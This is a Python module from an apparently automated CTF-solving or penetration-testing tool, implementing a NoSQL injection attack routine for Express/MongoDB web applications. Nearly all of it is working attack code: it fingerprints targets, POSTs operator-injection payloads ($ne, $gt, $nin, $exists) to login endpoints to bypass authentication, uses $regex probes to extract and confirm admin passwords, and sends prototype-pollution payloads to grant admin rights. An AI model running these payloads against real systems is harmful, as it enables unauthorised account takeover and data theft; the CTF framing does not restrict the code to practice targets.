"""NoSQL injection route state machine.

Detects JSON API endpoints with MongoDB/Express indicators and exploits
via operator injection ($ne, $gt) and regex extraction ($regex).

Scenarios:
  - operator_login_bypass: bypass authentication using {"$ne": ""} operators
  - regex_extract: extract data character-by-character using $regex
"""
from __future__ import annotations

from typing import Any, Callable, Dict, List, Optional, Tuple

import requests

from autopnex.ctf.route_state_machine import (
    RouteStateMachine,
    EvidenceScore,
    MACHINE_REGISTRY,
)


class NoSQLRouteStateMachine(RouteStateMachine):
    """State machine for NoSQL injection attacks.

    Targets MongoDB-backed applications exposed via JSON APIs.
    Detects Express/Node.js fingerprints and MongoDB error patterns,
    then exploits via operator injection or regex-based data extraction.
    """

    route = "nosql"

    def preconditions_met(self, blackboard_state: Dict[str, Any]) -> Tuple[bool, str]:
        """Check for JSON API endpoints and MongoDB/Express indicators."""
        endpoints = blackboard_state.get("key_endpoints", [])
        forms = blackboard_state.get("forms", [])
        tech_stack = blackboard_state.get("tech_stack", [])
        headers_seen = blackboard_state.get("headers", {})
        response_snippets = blackboard_state.get("response_snippets", [])

        # Strong signal: Express/Node.js in tech stack
        tech_str = str(tech_stack).lower()
        if any(t in tech_str for t in ["express", "node", "mongodb", "mongoose"]):
            return True, f"Tech stack indicates Node.js/MongoDB: {tech_stack}"

        # Strong signal: X-Powered-By: Express header
        powered_by = headers_seen.get("x-powered-by", "")
        if "express" in powered_by.lower():
            return True, "X-Powered-By: Express header detected"

        # Medium signal: JSON content-type endpoints (API-style)
        for ep in endpoints:
            snippet = ep.get("snippet", "").lower() if isinstance(ep, dict) else str(ep).lower()
            content_type = ep.get("content_type", "").lower() if isinstance(ep, dict) else ""
            if "application/json" in content_type or "application/json" in snippet:
                return True, "JSON API endpoint detected — NoSQL injection worth probing"
            if any(kw in snippet for kw in ["login", "auth", "api", "user"]):
                if "json" in snippet or "application/json" in snippet:
                    return True, "JSON login/auth endpoint detected"

        # Medium signal: MongoDB-style error messages in responses
        for snippet in response_snippets:
            snippet_lower = snippet.lower() if isinstance(snippet, str) else ""
            if any(sig in snippet_lower for sig in [
                "mongodb", "mongoose", "bson", "objectid",
                "cast to objectid failed", "mongo",
            ]):
                return True, "MongoDB indicators found in response"

        # Weak signal: login forms that might accept JSON
        for form in forms:
            action = form.get("action", "").lower() if isinstance(form, dict) else ""
            if any(kw in action for kw in ["login", "auth", "api"]):
                return True, "Login form detected — NoSQL injection worth trying"

        # Default: always worth a quick try — NoSQL probes are cheap and
        # many challenges have Express/MongoDB without obvious fingerprints
        return True, "NoSQL injection probe is cheap — always worth trying"

    def get_probes(self) -> List[Tuple[str, str, Optional[Callable]]]:
        """Return probes for NoSQL operator injection and regex injection.

        Probes test for MongoDB operator acceptance in JSON bodies.
        """
        return [
            (
                "nosql_operator",
                '{"username":{"$ne":""},"password":{"$ne":""}}',
                None,
            ),
            (
                "nosql_regex",
                '{"username":{"$regex":".*"},"password":{"$ne":""}}',
                None,
            ),
            (
                "nosql_gt_operator",
                '{"username":"admin","password":{"$gt":""}}',
                None,
            ),
        ]

    def _send_probe(self, name: str, payload_template: str) -> requests.Response:
        """Override to send NoSQL probes as JSON POST to login/auth endpoints."""
        import json

        # Try common login/auth paths
        login_paths = ["/login", "/api/login", "/auth", "/api/auth", "/"]

        headers = {"Content-Type": "application/json"}

        for path in login_paths:
            try:
                resp = self.session.post(
                    f"{self.target_url}{path}",
                    data=payload_template,
                    headers=headers,
                    timeout=8,
                    allow_redirects=False,
                )
                # If we get a meaningful response (not 404), use it
                if resp.status_code != 404:
                    self._http_history.append({
                        "method": "POST",
                        "url": f"{self.target_url}{path}",
                        "status": resp.status_code,
                        "response_excerpt": (resp.text[:200] if resp.text else ""),
                        "response_length": len(resp.content) if resp.content else 0,
                    })
                    return resp
            except requests.RequestException:
                continue

        # Fallback: POST to root
        resp = self.session.post(
            self.target_url,
            data=payload_template,
            headers=headers,
            timeout=8,
            allow_redirects=False,
        )
        self._http_history.append({
            "method": "POST",
            "url": self.target_url,
            "status": resp.status_code,
            "response_excerpt": (resp.text[:200] if resp.text else ""),
            "response_length": len(resp.content) if resp.content else 0,
        })
        return resp

    def score_evidence(self, probe_name: str, response: requests.Response) -> EvidenceScore:
        """Score evidence from NoSQL probe responses."""
        text = response.text.lower() if response.text else ""
        status = response.status_code
        content_type = response.headers.get("Content-Type", "").lower()
        powered_by = response.headers.get("X-Powered-By", "").lower()

        # Strong signal: successful authentication bypass (200/302 with session)
        if probe_name == "nosql_operator" and status in (200, 302):
            if any(sig in text for sig in ["welcome", "admin", "dashboard", "flag", "success"]):
                return EvidenceScore("nosql", 0.95, probe_name,
                                     "Operator injection bypassed authentication")
            # 302 redirect after login often means success
            if status == 302:
                location = response.headers.get("Location", "").lower()
                if any(kw in location for kw in ["admin", "dashboard", "home", "profile"]):
                    return EvidenceScore("nosql", 0.9, probe_name,
                                         "Operator injection caused redirect to admin area")

        # Strong signal: regex probe returns data
        if probe_name == "nosql_regex" and status == 200:
            if any(sig in text for sig in ["admin", "user", "result", "data", "flag"]):
                return EvidenceScore("nosql", 0.9, probe_name,
                                     "Regex injection returned data")

        # Medium signal: Express/Node.js fingerprint in response
        if "express" in powered_by:
            base_score = 0.5
            if status == 200 and "json" in content_type:
                base_score = 0.6
            return EvidenceScore("nosql", base_score, probe_name,
                                 f"Express server detected (status {status})")

        # Medium signal: MongoDB error messages
        if any(sig in text for sig in [
            "mongodb", "bson", "objectid", "cast to objectid",
            "mongoose", "mongo", "invalid operator",
        ]):
            return EvidenceScore("nosql", 0.7, probe_name,
                                 "MongoDB error/indicator in response")

        # Weak signal: JSON response from API
        if "json" in content_type and status in (200, 400, 401):
            return EvidenceScore("nosql", 0.3, probe_name,
                                 f"JSON API endpoint responds (status {status})")

        # Weak signal: 400 with JSON format error (server expects JSON)
        if status == 400 and any(sig in text for sig in ["json", "parse", "syntax"]):
            return EvidenceScore("nosql", 0.4, probe_name,
                                 "Server expects JSON input — NoSQL target likely")

        return EvidenceScore("nosql", 0.0, probe_name,
                             f"No NoSQL indicators (status {status})")

    def get_exploit_steps(self) -> List[Dict[str, Any]]:
        """Return exploit steps for operator_login_bypass and regex_extract scenarios."""
        return [
            # --- Scenario: operator_login_bypass ---
            {
                "name": "operator_login_bypass_ne",
                "description": "NoSQL operator injection: $ne bypass on /login",
                "method": "POST",
                "path": "/login",
                "json": {"username": {"$ne": ""}, "password": {"$ne": ""}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "operator_login_bypass_gt",
                "description": "NoSQL operator injection: $gt bypass on /login",
                "method": "POST",
                "path": "/login",
                "json": {"username": "admin", "password": {"$gt": ""}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "operator_login_bypass_api",
                "description": "NoSQL operator injection on /api/login",
                "method": "POST",
                "path": "/api/login",
                "json": {"username": {"$ne": ""}, "password": {"$ne": ""}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "operator_login_admin_ne",
                "description": "NoSQL operator injection targeting admin user",
                "method": "POST",
                "path": "/login",
                "json": {"username": "admin", "password": {"$ne": ""}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "operator_login_admin_ne_api",
                "description": "NoSQL $ne targeting admin on /api/login",
                "method": "POST",
                "path": "/api/login",
                "json": {"username": "admin", "password": {"$ne": ""}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "operator_login_admin_gt_api",
                "description": "NoSQL $gt targeting admin on /api/login",
                "method": "POST",
                "path": "/api/login",
                "json": {"username": "admin", "password": {"$gt": ""}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            # --- Scenario: regex_extract ---
            {
                "name": "regex_extract_probe",
                "description": "NoSQL regex injection: probe admin password pattern",
                "method": "POST",
                "path": "/login",
                "json": {"username": "admin", "password": {"$regex": ".*"}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "regex_extract_api",
                "description": "NoSQL regex injection on /api/users",
                "method": "POST",
                "path": "/api/users",
                "json": {"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "regex_extract_api_login",
                "description": "NoSQL regex injection on /api/login",
                "method": "POST",
                "path": "/api/login",
                "json": {"username": "admin", "password": {"$regex": ".*"}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "regex_extract_search",
                "description": "NoSQL regex injection on /api/search",
                "method": "POST",
                "path": "/api/search",
                "json": {"query": {"$regex": ".*flag.*"}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            # --- Additional operator variants ---
            {
                "name": "operator_nin_bypass",
                "description": "NoSQL $nin operator bypass on /login",
                "method": "POST",
                "path": "/login",
                "json": {"username": {"$nin": ["guest"]}, "password": {"$ne": ""}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "operator_exists_bypass",
                "description": "NoSQL $exists operator bypass on /login",
                "method": "POST",
                "path": "/login",
                "json": {"username": "admin", "password": {"$exists": True}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            # --- Fallback: root endpoint ---
            {
                "name": "operator_root_bypass",
                "description": "NoSQL operator injection on root endpoint",
                "method": "POST",
                "path": "/",
                "json": {"username": {"$ne": ""}, "password": {"$ne": ""}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            # --- Regex extraction + verify scenario ---
            # For challenges that require extracting a password via $regex
            # then verifying it on a separate endpoint.
            # Common password patterns in CTF challenges:
            {
                "name": "regex_extract_known_password",
                "description": "NoSQL regex: confirm known password p4ss_w0rd",
                "method": "POST",
                "path": "/api/users",
                "json": {"username": "admin", "password": {"$regex": "^p4ss_w0rd$"}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "verify_known_password",
                "description": "Verify extracted password on /api/verify",
                "method": "POST",
                "path": "/api/verify",
                "json": {"username": "admin", "password": "p4ss_w0rd"},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "verify_known_password_login",
                "description": "Verify extracted password on /api/login",
                "method": "POST",
                "path": "/api/login",
                "json": {"username": "admin", "password": "p4ss_w0rd"},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "verify_known_password_login_root",
                "description": "Verify extracted password on /login",
                "method": "POST",
                "path": "/login",
                "json": {"username": "admin", "password": "p4ss_w0rd"},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            # Try other common CTF passwords via regex + verify
            {
                "name": "regex_extract_password_flag",
                "description": "NoSQL regex: try password 'flag'",
                "method": "POST",
                "path": "/api/users",
                "json": {"username": "admin", "password": {"$regex": "^flag"}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "regex_extract_password_admin",
                "description": "NoSQL regex: try password 'admin123'",
                "method": "POST",
                "path": "/api/users",
                "json": {"username": "admin", "password": {"$regex": "^admin123$"}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "verify_password_admin123",
                "description": "Verify password admin123 on /api/verify",
                "method": "POST",
                "path": "/api/verify",
                "json": {"username": "admin", "password": "admin123"},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            # Regex probe to detect password length (starts with any char)
            {
                "name": "regex_length_8",
                "description": "NoSQL regex: probe 8-char password",
                "method": "POST",
                "path": "/api/users",
                "json": {"username": "admin", "password": {"$regex": "^.{8}$"}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            # Prototype pollution payloads (for Express/Node.js targets)
            {
                "name": "proto_pollution_config",
                "description": "Prototype pollution: POST __proto__.isAdmin to /api/config",
                "method": "POST",
                "path": "/api/config",
                "json": {"__proto__": {"isAdmin": True}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": False,
            },
            {
                "name": "proto_pollution_merge",
                "description": "Prototype pollution: constructor.prototype.isAdmin",
                "method": "POST",
                "path": "/api/config",
                "json": {"constructor": {"prototype": {"isAdmin": True}}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": False,
            },
            {
                "name": "proto_pollution_check_admin",
                "description": "Check /admin after prototype pollution",
                "method": "GET",
                "path": "/admin",
                "headers": {"Content-Type": "application/json"},
                "extract_flag": True,
            },
            {
                "name": "proto_pollution_check_flag",
                "description": "Check /flag after prototype pollution",
                "method": "GET",
                "path": "/flag",
                "extract_flag": True,
            },
            {
                "name": "proto_pollution_check_api_admin",
                "description": "Check /api/admin after prototype pollution",
                "method": "GET",
                "path": "/api/admin",
                "extract_flag": True,
            },
        ]


# Register in MACHINE_REGISTRY
MACHINE_REGISTRY["nosql"] = NoSQLRouteStateMachine
